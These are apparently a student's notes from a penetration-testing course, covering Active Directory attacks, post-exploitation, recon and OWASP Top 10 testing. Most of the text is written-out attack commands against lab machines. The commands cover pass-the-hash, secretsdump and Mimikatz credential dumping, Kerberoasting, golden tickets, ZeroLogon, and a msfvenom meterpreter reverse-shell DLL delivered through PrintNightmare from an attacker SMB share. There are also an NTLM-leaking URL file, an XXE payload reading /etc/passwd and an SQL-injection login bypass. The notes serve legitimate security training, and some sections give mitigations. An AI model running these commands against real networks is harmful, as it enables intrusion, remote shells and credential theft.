![[Pasted image 20230317083413.png]]

### Bloodhound Overview and Setup

> [!info] 
> Download all DC / Domain related data and analyzing. 
> 

> [!todo] 
> Install bloodhound
> `sudo apt install bloodhound` 
> `sudo neo4j console`
> Open: `http://localhost:7474/`
> Login with User: `neo4j` and PW: `neo4j`
> Change to new strong password
> run `sudo bloodhound`
> Login with new credentials


### Grabbing Data with Invoke-Bloodhound

> [!todo] 
> Download SharpHound.ps1 on Windows Target:
> https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
> `powershell -ep bypass`
> `. .\SharpHound.ps1`
> `Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName file.zip`
> - Drag and Drop ZIP file from Windows VM to Host
> - Move ZIP file to Kali VM

### Enumerating Domain Data with Bloodhound

![[Pasted image 20230322192720.png]]

![[Pasted image 20230322193027.png]]
![[Pasted image 20230322193208.png]]

![[Pasted image 20230322193244.png]]

![[Pasted image 20230322193359.png]]

> [!todo] 
> Click on Box, you will see where machine where Admin is logged in. This machine we will try to compromise later.

![[Pasted image 20230322194114.png]]
![[Pasted image 20230322194255.png]]

![[Pasted image 20230322194358.png]]

> [!info] 
> We can see here that SQL Server is member of Domain Admins
> 

![[Pasted image 20230322194617.png]]

## Attacking Active Directory: Post-Compromise Attacks

### Introduction

> [!info] 
> All this techniques in this chapter requires kind of credential (hash, password, username, etc.)


### Pass the Hash / Password Overview

![[Pasted image 20230323084646.png]]

![[Pasted image 20230323084836.png]]

![[Pasted image 20230323084943.png]]

![[Pasted image 20230323085018.png]]


### Installing crackmapexec

> [!todo] 
>  `sudo apt-get install crackmapexec`
>  `crackmapexec --help`

![[Pasted image 20230323085451.png]]

### Pass the Password Attacks

> [!todo] 
> `crackmapexec smb 192.168.203.0/24 -u fcastle -d MARVEL.local -p Password1` 

![[Pasted image 20230323085910.png]]

> [!todo] 
> Dump SAM file:
> `crackmapexec smb 192.168.203.0/24 -u fcastle -d MARVEL.local -p Password1 --sam` 

![[Pasted image 20230323090210.png]]

> [!todo] 
> Get Shell on Windows VM:
> `impacket-psexec marvel/fcastle:Password1@192.168.203.137` 

![[Pasted image 20230323090640.png]]

### Dumping Hashes with secretsdump.py

> [!todo] 
>  `impacket-secretsdump marvel/fcastle:Password1@192.168.203.137`

![[Pasted image 20230323091207.png]]

> [!info] 
> If you dump it from different machines, you can check if hashes are same (password reuse)
> 

![[Pasted image 20230323091417.png]]

### Cracking NTLM Hashes with Hashcat

> [!attention] 
> NTLM can be passed around, NTLM 2 hashes can't 
> 

> [!todo] 
> On Host OS, not VM, otherwise it's slow:
> `hashcat.exe -m 1000 hashes.txt rockyou.txt -O` 

![[Pasted image 20230323092239.png]]

### Pass the Hash Attacks

> [!todo] 
> `crackmapexec smb 192.168.203.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b --local-auth` 

![[Pasted image 20230323101025.png]]

> [!todo] 
>  Try to authentificate with hash:
>  `impacket-psexec "frank castle":@192.168.203.137 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b`

![[Pasted image 20230323101621.png]]

### Pass Attack Mitigations

![[Pasted image 20230323101737.png]]

### Token Impersonation Overview

![[Pasted image 20230323102101.png]]

![[Pasted image 20230323102242.png]]

![[Pasted image 20230323102329.png]]

![[Pasted image 20230323102419.png]]

![[Pasted image 20230323102442.png]]

![[Pasted image 20230323102506.png]]

![[Pasted image 20230323102539.png]]

![[Pasted image 20230323102610.png]]

![[Pasted image 20230323102637.png]]

### Token Impersonation with Incognito

> [!todo] 
> Start Metasploit:
> `msfconsole`
> `use exploit/windows/smb/psexec`
> `options`
> `set rhosts 192.168.203.137`
> `set smbdomain marvel.local`
> `set smbpass Password1`
> `set smbuser fcastle`

![[Pasted image 20230323104049.png]]

> [!todo] 
> `show targets`
> `set target 2`
> 

![[Pasted image 20230323104155.png]]

> [!todo] 
> `set payload windows/x64/meterpreter/reverse_tcp` 
> `set lhost eth0`

![[Pasted image 20230323104433.png]]

> [!todo] 
> `run` 

![[Pasted image 20230323104546.png]]

> [!todo] 
> Now we have a meterpreter shell. Now we can run all fun stuff:
> `hashdump`
> `getuid`
> `sysinfo`

![[Pasted image 20230323104725.png]]

![[Pasted image 20230323104856.png]]

> [!todo] 
> `load incognito` 
> `help`

![[Pasted image 20230323105033.png]]

> [!todo] 
> `list_tokens -u`

![[Pasted image 20230323105502.png]]

> [!todo] 
> `impersonate_token marvel\\administrator` 
> `shell`
> `whoami`

![[Pasted image 20230323165805.png]]

![[Pasted image 20230323165847.png]]

> [!todo] 
> `Ctrl C` to leave Windows shell
> `rev2shell` to go back as user we got in to machine
> How we can use again for example `hashdump`

![[Pasted image 20230323170146.png]]

> [!todo] 
> Login to our Windows 10 VM as `fcastle` 

![[Pasted image 20230323170307.png]]

> [!info] 
> Now we can see that `fcastle` user is logged in:
> `list_tokens -u`

![[Pasted image 20230323170450.png]]

> [!hint] 
> This token is valid until reboot 

> [!todo] 
>  `impersonate_token marvel\\fcastle`
>  `shell`
>  `whoami`

![[Pasted image 20230323170752.png]]

### Token Impersonation Mitigation

![[Pasted image 20230323170913.png]]

> [!important] 
>  - Domain Administrator should only login to machines which are Domain Controllers
>  - If Domain Administrator login to Computer or Server and this Machine got compromised, the maybe can impersonate his token
>  - Administrator (for example `bob-admin`) should have additional account for daily use (`bob`) without Domain Admin privilage.

### Kerberoasting Overview

![[Pasted image 20230323171606.png]]

![[Pasted image 20230323173026.png]]

![[Pasted image 20230323173120.png]]

### Kerberoasting Walkthrough

> [!todo] 
>  `impacket-GetUserSPNs marvel.local/fcastle:Password1 -dc-ip 192.168.203.136 -request`

![[Pasted image 20230323173533.png]]

> [!info] 
> Now try to crack hash:
> `hashcat --help | grep Kerberos`

![[Pasted image 20230323173856.png]]

> [!todo] 
> Crack hash:
> `hashcat.exe -m 13100 hashes.txt rockyou.txt -O` 

![[Pasted image 20230323174125.png]]

> [!hint] 
> Now we cracked Password of 14 characters which has Domain Admin access
> **Don't use weak passwords!**

### Kerberoasting Mitigation

![[Pasted image 20230323174426.png]]

> [!tip] 
> - Use strong password for service accounts (30 characters or more)
> - Don't make your users Domain Administrator
> - Don't make your service accounts Domain Administrator


### GPP / cPassword Attacks Overview

> [!note] 
>  Resources for this video:
>  Group Policy Pwnage: [https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)
>  - Group Policy Preferences (GPP): These policies allowed administrators to set local accounts, embed credentials for the purposes of mapping drives, or perform other tasks that may otherwise require an embedded password in a script.
>  - Storage mechanism for the credentials was flawed and allowed attackers to trivially decrypt the plaintext credentials.
>  - While addressed in MS14-025, this patch only prevents new policies from being created, and any legacy GPPs containing credentials must be found and removed.

![[Pasted image 20230325122423.png]]

> [!tip] 
> There is module in Metasploit to scan for it:
> `smb_enum_gpp`
> 


### Abusing GPP: Part 1

> [!info] 
> Start VM on HackTheBox (VIP Account needed for this Machine):
> https://app.hackthebox.com/machines/Active
> 

> [!todo] 
> Start VM, connect  via VPN:
> `sudo openvpn your-profile.ovpn`


> [!todo] 
> nmap Scan:
> `nmap -T5 10.10.10.100`
> 

![[Pasted image 20230329152622.png]]

> [!todo] 
> Check Anonymous Loging via SMB:
>  `smbclient -L \\\\10.10.10.100\\`

![[Pasted image 20230329152803.png]]

> [!todo] 
> We have access to `Replication` share as anonymous:
>  `smbclient \\\\10.10.10.100\\Replication`

![[Pasted image 20230329153002.png]]

> [!todo] 
> Run in `smb` shell:
> `prompt off` 
> `recurse on`
> `ls`

![[Pasted image 20230329153447.png]]

![[Pasted image 20230329153611.png]]

> [!info] 
> `Groups.xml` is file we're intressted in
> 

> [!todo] 
> `mget *` 

![[Pasted image 20230329153741.png]]

![[Pasted image 20230329153932.png]]

![[Pasted image 20230329154105.png]]


> [!todo] 
> Run in Kali Terminal:
> `gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ` 

![[Pasted image 20230329154240.png]]

> [!done] 
> Now we have username and password:
> Username: `active.htb\SVC_TGS`
> Password: `GPPstillStandingStrong2k18`


### Abusing GPP: Part 2

#### Try my own way to Pwn DC

> [!note] 
> Try to login and try to escalate privilage by myself:
>  Use Kerberoasting Attack to get Hash of Administrator and crack it:

![[Pasted image 20230329164707.png]]

![[Pasted image 20230329164810.png]]

> [!success] 
> Username: Administrator
> Password: Ticketmaster1968
> 


> [!todo] 
> `crackmapexec smb 10.10.10.100  -u "Administrator" -p Ticketmaster1968` 

![[Pasted image 20230329165407.png]]

> [!todo] 
> `msfconsole`
> `use exploit/windows/smb/psexec`

![[Pasted image 20230329165843.png]]

![[Pasted image 20230329170029.png]]

![[Pasted image 20230329170636.png]]


### URL File Attacks

> [!info] 
>  Chapter Info:
>  Active Directory Attacks - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share)

``` 
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\x.x.x.x\%USERNAME%.icon
IconIndex=1
```

> [!todo] 
> Put IP of your Kali (Attacker) Machine.
> Safe this content to File Share and use filename like this:  `"@test.url"`  (Including quotes)

![[Pasted image 20230330161351.png]]

> [!todo] 
> On Kali VM:
> `sudo responder -I eth0 -v`
> 

> [!info] 
> When no someone go to this share, automatically this request is send out to our Kali
> 

![[Pasted image 20230330161612.png]]

> [!info] 
> You can use this NTLMv2 Hash to relay to target you like to access
> 

> [!warning] 
> As a reminder: NTLMv2 can't be bruteforced
> 


### PrintNightmare (CVE-2021-1675) Walkthrough


> [!attention] 
> Looks like this attack is also working for Windows 10 Standalone Machines (No Domain Controll member)

> [!info] 
> Lession Info:
>  cube0x0 RCE - [https://github.com/cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)
>  calebstewart LPE - [https://github.com/calebstewart/CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675)

> [!todo] 
> See if DC is vulnerable for PrintNightmare:
> `impacket-rpcdump @192.168.203.136 | egrep 'MS-RPRN|MS-PAR' ` 

![[Pasted image 20230330162401.png]]

> [!todo] 
> Download  PrintNightmare from Github (cube0x0 RCE) on your Kali

> [!todo] 
> Create Malicious DLL Reverse Shell :
> `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.203.135 LPORT=5555 -f dll > shell.dll` 

> [!todo] 
> Start Listener:
> `msfconsole` 
> `use multi/handler`
> `set payload windows/x64/meterpreter/reverse_tcp`
> `set lport 5555`
> `set lhost eth0`
> `run`

![[Pasted image 20230330163702.png]]

> [!todo] 
> At folder where DLL is which we created, run:
> `impacket-smbserver share ./ 'pwd' -smb2support` 

> [!todo] 
> Run PrinterNightmare.py on Kali:
>  `./PrintNightmare.py marvel.local/fcastle:Password1@192.168.203.136 '\\192.168.203.135\share\shell.dll'`

![[Pasted image 20230330165432.png]]

> [!attention] 
> If Server Antivirus detect malicious `dll`, you have to obfuscate dll.
> 




### Mimikatz Overview

> [!info] 
> Resources for this video:
> Mimikatz: [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) 

![[Pasted image 20230331150643.png]]

> [!caution] 
> It could be that in newer updates of Windows Mimikatz isn't working anymore. It's a mouse and cat game...
> 



### Credential Dumping with Mimikatz

> [!tip] 
>  Mimikatz Wiki is a great place to find out detailed informations:
>  https://github.com/gentilkiwi/mimikatz/wiki

> [!todo] 
>  - Go im `cmd` to Mimikatz folder
>  - Run `>mimikatz.exe`
>  - `privilege::debug`
>  - `sekurlsa::logonpasswords`

![[Pasted image 20230331153245.png]]

![[Pasted image 20230331153630.png]]

> [!tip] 
> We can try to pass around NTLM hash to get access somewhere 

![[Pasted image 20230331153807.png]]

> [!info] 
> - `wdigest` was feature which stored password in cleartext. It's deactivated since around windows 10 or before, by default.  But feature still exists.
> - `wdigest` can be enabled in registry

> [!todo] 
> Dump SAM:
> `lsadump::sam` 
> or if that failed
> `lsadump::sam /patch`
> otherwise use other tools like metasploit for that

> [!todo] 
> LSA - Local Security Authority
> ` lsadump::lsa /patch` 

![[Pasted image 20230331154413.png]]

> [!info] 
> Here we get usernames and `NTLM` hashes. We can try to crack them with `hashcat`.
> 

> [!tip] 
> We can use cracked passwords to put in our report and give recomendation to our client about if his password policy is good or not.  


### Golden Ticket Attacks

> [!info] 
> If we have username and password we can use `Ticket-Granting Ticket (TGT)` on Domain Controller.  

> [!todo] 
>  - Go im `cmd` to Mimikatz folder
>  - Run `>mimikatz.exe`
>  -  `privilege::debug`
>  - `lsadump::lsa /inject /name:krbtgt`

![[Pasted image 20230331173219.png]]

![[Pasted image 20230331173402.png]]

> [!todo] 
>  In Mimikatz:
>  `kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-2219376320-3670275496-2911372019 /krbtgt:fa02fc5707d4280acb4ddcec1d381a66 /id:500 /ptt`

> [!question] 
> `id` 500 is ID of Administrator 
> `ptt` stands for pass the ticket

![[Pasted image 20230331173831.png]]

> [!todo] 
>  `misc::cmd` - We have now session we created in `cmd` promt
>  `dir \\THEPUNISHER\c$`

![[Pasted image 20230331174118.png]]

> [!todo] 
> Download psexec.exe from Microsoft: https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
> run in this `cmd` window: `>PsExec.exe \\THEPUNISHER cmd.exe` and you will have shell on that machine
> 

![[Pasted image 20230401140245.png]]


### Conclusion and Additional Resources

> [!note] 
>  Resources for this video:
Active Directory Security Blog: https://adsecurity.org/
Harmj0y Blog: http://blog.harmj0y.net/
Pentester Academy Active Directory: https://www.pentesteracademy.com/activedirectorylab
Pentester Academy Red Team Labs: https://www.pentesteracademy.com/redteamlab
eLS PTX: https://elearnsecurity.com/product/ecptx-certification/


## Additional Active Directory Attacks

### Abusing ZeroLogon

> [!note] 
>  Resources for this video:
What is ZeroLogon? - https://www.trendmicro.com/en_us/what-is/zerologon.html
dirkjanm CVE-2020-1472 - https://github.com/dirkjanm/CVE-2020-1472
SecuraBV ZeroLogon Checker - https://github.com/SecuraBV/CVE-2020-1472

> [!warning] 
> This set Domain Controller Admin to zero. So this is maybe not recomended on pentest or at least make sure you restore password after.
> 

> [!todo] 
> Clone  [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472) and also [https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)

> [!todo] 
> Test if DC is vulnerable for ZeroLogon:
>  Go to cloned folder of `SecuraBV ZeroLogon Checker`
>  `python3 zerologon_tester.py HYDRA-DC 192.168.203.136`

![[Pasted image 20230401142404.png]]

> [!warning] 
> Better not to run acctual attack after you do that check. Just call customer and tell them to patch it.
> 

> [!todo] 
> Run Attack in **Lab** environment:
>  Go to cloned folder of `dirkjanm CVE-2020-1472`
>  `python3 cve-2020-1472-exploit.py HYDRA-DC 192.168.203.136`

![[Pasted image 20230401142810.png]]

> [!todo] 
> `impacket-secretsdump -just-dc MARVEL/HYDRA-DC\$@192.168.203.136`

> [!done] 
> When you get promt to put `Password`, only press enter! 

![[Pasted image 20230401143024.png]]

> [!todo] 
> How to restore password:
>  `impacket-secretsdump administrator@192.168.203.136 -hashes aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33` - Use hash of Administrator

![[Pasted image 20230401143602.png]]

> [!info] 
> This info after `plain_password_hex` we use to restore password of DC:
> `python3 restorepassword.py MARVEL/HYDRA-DC@HYDRA-DC -target-ip 192.168.203.136 -hexpass ee174e678e6460b16c3b465d04a601c803d0aca0d5c6a3aa70b57e078ec6a428ad8d0c3f10a2335e7837e3f1a6804231d60b02c1f9b6fcb0a698c4bb9ad954d18f0839b9c20a5d300249034bff0966f934b090022a4317a2f800ef7b4cb2d1bb2da0ac810a6e773181c99ba730164542f9664f8646627d44ce56b150d05970b6221e55a10da1b3612311e97a2047f74eb6a8ec94f8824c05f9461ba2065dceb02c9cfba7afd3c2f9678d5afdf0a0640f8b46d43cecb43a367b5f5afdbf139e3f8c4d347ea61b2584f6c2857bb043f6698b33905b26a036150fae41c96293a0f13cf11e3e6253d25a13851a5376804e90
`

![[Pasted image 20230401143709.png]]

![[Pasted image 20230401143929.png]]


## Post Exploitation

### File Transfers Review

![[Pasted image 20230401144820.png]]

### Maintaining Access Overview

> [!warning] 
> Normally you don't persistence on a pentest. Only maybe `Add a User` for time of pentest.  

![[Pasted image 20230401145120.png]]

> [!info] 
> Commands above are from metasploit
> 


### Pivoting Lab Setup

> [!todo] 
> - Shutdown both Windows 10 VMs

![[Pasted image 20230401151318.png]]

> [!todo] 
> - Add `VMnet7` as additional Network Interface to first Windows VM 
> - Change Network Interface Windows VM No. 2 to `VMnet7`
> - Boot up VM's
> - Check IP configuration of both Windows VMs:

![[Pasted image 20230401151809.png]]

![[Pasted image 20230401151831.png]]

### Pivoting Walkthrough

> [!todo] 
> Start Metasploit on Kali VM:
> `msfconsole`
>  `use exploit/windows/smb/psexec`
>  `set rhost 192.168.203.137`
>  `set smbdomain marvel.local`
>  `set smbpass Password1`
>  `set smbuser fcastle`
>  `set payload windows/x64/meterpreter/reverse_tcp`
>  `set lhost eth0`
>  `set target 2`

![[Pasted image 20230401152444.png]]

![[Pasted image 20230401152609.png]]

> [!todo] 
> `shell`
> `route print`
> `ipconfig`
> `arp -a`

![[Pasted image 20230401152727.png]]

![[Pasted image 20230401152833.png]]

> [!todo] 
> `Ctrl C` to leave shell and go back `meterpreter` shell 

> [!todo] 
> In meterpreter:
> `run autoroute -s 10.10.10.0/24` 

![[Pasted image 20230401153100.png]]

> [!todo] 
>  `run autoroute -p`

![[Pasted image 20230401153203.png]]

> [!todo] 
> `background` 

![[Pasted image 20230401153247.png]]

> [!todo] 
>  `search portscan`
>  `use auxiliary/scanner/portscan/tcp`
>  `options`
>  `set rhost 10.10.10.128`
>  `set ports 445`

![[Pasted image 20230401153549.png]]


### Cleaning Up

![[Pasted image 20230401153739.png]]


## Web Application Enumeration, Revisited

### Installing Go

> [!todo] 
> Use `pimpmykali` script:
>  https://github.com/Dewalt-arch/pimpmykali
>  `sudo ./pimpmykali.sh`
>  3 - Fix Golang  `3`


### Finding Subdomains with Assetfinder

> [!todo] 
> Install `assetfinder` https://github.com/tomnomnom/assetfinder
> `apt-get install assetfinder`

> [!todo] 
>  `assetfinder tesla.com`
>  `assetfinder tesla.com >> tesla-subdomains.txt` -> To safe to text file
>  `assetfinder --subs-only tesla.com`

![[Pasted image 20230402102807.png]]

### Finding Subdomains with Amass

> [!todo] 
> Install Amass by OWASP:
>  https://github.com/owasp-amass/amass
>`sudo apt-get update`
>`sudo apt-get install amass`
>`amass enum -d tesla.com`


### Finding Alive Domains with Httprobe

> [!info] 
> This tool check if host alive or not 

> [!todo] 
> Install Httprobe:
> https://github.com/tomnomnom/httprobe
> `sudo apt-get install httprobe` 
> `cat tesla.com/recon/final.txt | httprobe`


### Screenshotting Websites with GoWitness

> [!todo] 
> Install GoWitness:
> https://github.com/sensepost/gowitness
> `go install github.com/sensepost/gowitness@latest` 
> `gowitness single https://tesla.com`


### Automating the Enumeration Process

> [!note] 
> Resources for this video:
> sumrecon: [https://github.com/thatonetester/sumrecon](https://github.com/thatonetester/sumrecon)
> TCM's modified script - [https://pastebin.com/MhE6zXVt](https://pastebin.com/MhE6zXVt) 

> [!todo] 
> Install additional tools
> `sudo apt-get update`
>  `sudo apt-get install subjack`
>  `go install -v github.com/tomnomnom/waybackurls@latest`
>  

``` 
#!/bin/bash

######
# Source script by TCM Security: https://pastebin.com/raw/MhE6zXVt
# Modify by me
######

# Go User's home folder
cd 

url=$1

if [ ! -d "$url" ];then
	mkdir $url
fi
if [ ! -d "$url/recon" ];then
	mkdir $url/recon
fi
#    if [ ! -d '$url/recon/eyewitness' ];then
#        mkdir $url/recon/eyewitness
#    fi
if [ ! -d "$url/recon/scans" ];then
	mkdir $url/recon/scans
fi
if [ ! -d "$url/recon/httprobe" ];then
	mkdir $url/recon/httprobe
fi
if [ ! -d "$url/recon/potential_takeovers" ];then
	mkdir $url/recon/potential_takeovers
fi
if [ ! -d "$url/recon/wayback" ];then
	mkdir $url/recon/wayback
fi
if [ ! -d "$url/recon/wayback/params" ];then
	mkdir $url/recon/wayback/params
fi
if [ ! -d "$url/recon/wayback/extensions" ];then
	mkdir $url/recon/wayback/extensions
fi
if [ ! -f "$url/recon/httprobe/alive.txt" ];then
	touch $url/recon/httprobe/alive.txt
fi
if [ ! -f "$url/recon/final.txt" ];then
	touch $url/recon/final.txt
fi

echo "[+] Harvesting subdomains with assetfinder..."
assetfinder $url >> $url/recon/assets.txt
cat $url/recon/assets.txt | grep $1 >> $url/recon/final.txt
rm $url/recon/assets.txt

#echo "[+] Double checking for subdomains with amass..."
#amass enum -d $url >> $url/recon/f.txt
#sort -u $url/recon/f.txt >> $url/recon/final.txt
#rm $url/recon/f.txt

echo "[+] Probing for alive domains..."
cat $url/recon/final.txt | sort -u | httprobe -s -p https:443 | sed 's/https\?:\/\///' | tr -d ':443' >> $url/recon/httprobe/a.txt
sort -u $url/recon/httprobe/a.txt > $url/recon/httprobe/alive.txt
rm $url/recon/httprobe/a.txt

echo "[+] Checking for possible subdomain takeover..."

if [ ! -f "$url/recon/potential_takeovers/potential_takeovers.txt" ];then
	touch $url/recon/potential_takeovers/potential_takeovers.txt
fi

subjack -w $url/recon/final.txt -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 -o $url/recon/potential_takeovers/potential_takeovers.txt

echo "[+] Scanning for open ports..."
nmap -iL $url/recon/httprobe/alive.txt -T4 -oA $url/recon/scans/scanned.txt

echo "[+] Scraping wayback data..."
cat $url/recon/final.txt | waybackurls >> $url/recon/wayback/wayback_output.txt
sort -u $url/recon/wayback/wayback_output.txt

echo "[+] Pulling and compiling all possible params found in wayback data..."
cat $url/recon/wayback/wayback_output.txt | grep '?*=' | cut -d '=' -f 1 | sort -u >> $url/recon/wayback/params/wayback_params.txt
for line in $(cat $url/recon/wayback/params/wayback_params.txt);do echo $line'=';done

echo "[+] Pulling and compiling js/php/aspx/jsp/json files from wayback output..."
for line in $(cat $url/recon/wayback/wayback_output.txt);do
	ext="${line##*.}"
	if [[ "$ext" == "js" ]]; then
		echo $line >> $url/recon/wayback/extensions/js1.txt
		sort -u $url/recon/wayback/extensions/js1.txt >> $url/recon/wayback/extensions/js.txt
	fi
	if [[ "$ext" == "html" ]];then
		echo $line >> $url/recon/wayback/extensions/jsp1.txt
		sort -u $url/recon/wayback/extensions/jsp1.txt >> $url/recon/wayback/extensions/jsp.txt
	fi
	if [[ "$ext" == "json" ]];then
		echo $line >> $url/recon/wayback/extensions/json1.txt
		sort -u $url/recon/wayback/extensions/json1.txt >> $url/recon/wayback/extensions/json.txt
	fi
	if [[ "$ext" == "php" ]];then
		echo $line >> $url/recon/wayback/extensions/php1.txt
		sort -u $url/recon/wayback/extensions/php1.txt >> $url/recon/wayback/extensions/php.txt
	fi
	if [[ "$ext" == "aspx" ]];then
		echo $line >> $url/recon/wayback/extensions/aspx1.txt
		sort -u $url/recon/wayback/extensions/aspx1.txt >> $url/recon/wayback/extensions/aspx.txt
	fi
done

rm $url/recon/wayback/extensions/js1.txt
rm $url/recon/wayback/extensions/jsp1.txt
rm $url/recon/wayback/extensions/json1.txt
rm $url/recon/wayback/extensions/php1.txt
rm $url/recon/wayback/extensions/aspx1.txt

echo "[+] Running GoWitness against all compiled domains..."
gowitness file $url/recon/httprobe/alive.txt -d $url/recon/gowitness
```


### Additional Resources

> [!note] 
> The Bug Hunter's Methodology - [https://www.youtube.com/watch?v=uKWu6yhnhbQ](https://www.youtube.com/watch?v=uKWu6yhnhbQ)
> Nahamsec Recon Playlist - [https://www.youtube.com/watch?v=MIujSpuDtFY&list=PLKAaMVNxvLmAkqBkzFaOxqs3L66z2n8LA](https://www.youtube.com/watch?v=MIujSpuDtFY&list=PLKAaMVNxvLmAkqBkzFaOxqs3L66z2n8LA) 


## Testing the Top 10 Web Application Vulnerabilities


### The OWASP Top 10 and OWASP Testing Checklist

> [!note] 
> Resources for this video:
OWASP Top 10: https://owasp.org/www-pdf-archive/OWASP_Top_10-2017_%28en%29.pdf.pdf
OWASP Testing Checklist: https://github.com/tanprathan/OWASP-Testing-Checklist
OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf 

![Mapping](https://owasp.org/Top10/assets/mapping.png)

![[Pasted image 20230402143714.png]]

![[Pasted image 20230402144001.png]]


### Installing OWASP Juice Shop

> [!note] 
> Resources for this video:
Installing Docker on Kali: https://medium.com/@airman604/installing-docker-in-kali-linux-2017-1-fbaa4d1447fe
OWASP Juice Shop: https://github.com/bkimminich/juice-shop

> [!todo] 
> Install Docker on Kali:
>  https://airman604.medium.com/installing-docker-in-kali-linux-2017-1-fbaa4d1447fe

> [!caution] 
>  Reboot Machine after install

> [!todo] 
> Install OWASP Juice Shop:
> https://github.com/juice-shop/juice-shop
> `docker pull bkimminich/juice-shop`
> `docker run --rm -p 3000:3000 bkimminich/juice-shop`
> Browse to [http://localhost:3000](http://localhost:3000)


### Installing Foxy Proxy

> [!todo] 
> Install FoxyProxy in your Browser for fast Proxy switching:
> https://addons.mozilla.org/de/firefox/addon/foxyproxy-standard/
> 


### Exploring Burp Suite

![[Pasted image 20230402153540.png]]


### Introducing the Score Board

> [!todo] 
>  Solve first challange and open score board ;-)
>  http://localhost:3000/#/score-board
>

![[Pasted image 20230402154905.png]]


### SQL Injection Attacks Overview

> [!note] 
>  Resources for this video:
OWASP A1-Injection: https://www.owasp.org/index.php/Top_10-2017_A1-Injection

![[Pasted image 20230407105010.png]]

![[Pasted image 20230407105117.png]]

![[Pasted image 20230407105207.png]]

![[Pasted image 20230407105257.png]]

![[Pasted image 20230407105451.png]]


### SQL Injection Walkthrough

![[Pasted image 20230407110607.png]]

> [!done] 
> Create Server Error:
> `{"email":"f'","password":"sadfasdf"}` 

![[Pasted image 20230407110317.png]]

> [!done] 
> Login bypass for Admin (Admin ID 1)
`{"email":"' OR 1=1; --","password":"' OR 1=1 --"}`

> [!tip] 
> Blind SQL Injection:
If you put `(sleep 10)` in SQL query and website don't response, you know you have a Blind SQL injection 


### SQL Injection Defenses

![[Pasted image 20230407134429.png]]


### Broken Authentication Overview and Defenses

> [!note] 
> Resources for this video:
OWASP A2-Broken Authentication: https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication

![[Pasted image 20230407134926.png]]


### Testing for Broken Authentication

> [!info] 
> We put right email address and now form below is now active. This is a low level finding. We know this email exists! 

![[Pasted image 20230407135853.png]]

> [!tip] 
> Look for Token which not change if you log out and log in with other user
> 


### Sensitive Data Exposure Overview and Defenses

> [!note] 
> Resources for this video:
OWASP A3-Sensetive Data Exposure: https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure

![[Pasted image 20230407141506.png]]


### Testing for Sensitive Data Exposure

![[Pasted image 20230407141902.png]]

![[Pasted image 20230407142010.png]]

> [!tip] 
> Headers are interessting to check.  
> https://securityheaders.com/

![[Pasted image 20230407142616.png]]

> [!todo] 
> Check how strong website encryption is:
>  `nmap --script=ssl-enum-ciphers -p 443 tesla.com`


### XML External Entities (XXE) Overview

> [!todo] 
> Resources for this video:
OWASP A4-XML External Entities: https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE) 

![[Pasted image 20230407143131.png]]

``` 
<?xml version="1.0" encoding="ISO-8859-1" ?>
<!DOCTYPE gift [
	<!ENTITY from "John Doe">
]>

<gift>
	<To>Frank</To>
	<From>&from;</From>
	<Item>Pokemon Cards</Items>
</gift>
```

> [!info] 
> Google for XXE payloads:
> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md
> 

![[Pasted image 20230407144641.png]]

``` 
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```


### XXE Attack and Defense

![[Pasted image 20230407145527.png]]

> [!note] 
> As I run this in Docker, we don't see output of `passwd` file.
> Otherwise it will look like this:

![[Pasted image 20230407145657.png]]


### Broken Access Control Overview

> [!note] 
> Resources for this video:
OWASP A5-Broken Access Control: https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control

![[Pasted image 20230407150534.png]]


### Broken Access Control Walkthrough

> [!info] 
> Remove `hidden` attribute of userid field. This allows us to post feedback with other user id.

![[Pasted image 20230407151255.png]]


### Security Misconfiguration Attacks and Defenses

> [!note] 
> Resources for this video:
OWASP A6-Security Misconfigurations: https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration

![[Pasted image 20230407151633.png]]


### Cross-Site Scripting (XSS) Overview

> [!note] 
> Resources for this video:
> - OWASP A7-Cross Site Scripting: https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)
> - DOM Based XSS: https://www.scip.ch/en/?labs.20171214
> - XSS Game: https://xss-game.appspot.com/ 

![[Pasted image 20230407154452.png]]

![[Pasted image 20230407160526.png]]

> [!info] 
> Reflected:
> 
![[Pasted image 20230407160753.png]] 

> [!info] 
>  Stored:
>  For example in stored comment in blog post.

![[Pasted image 20230407162303.png]]


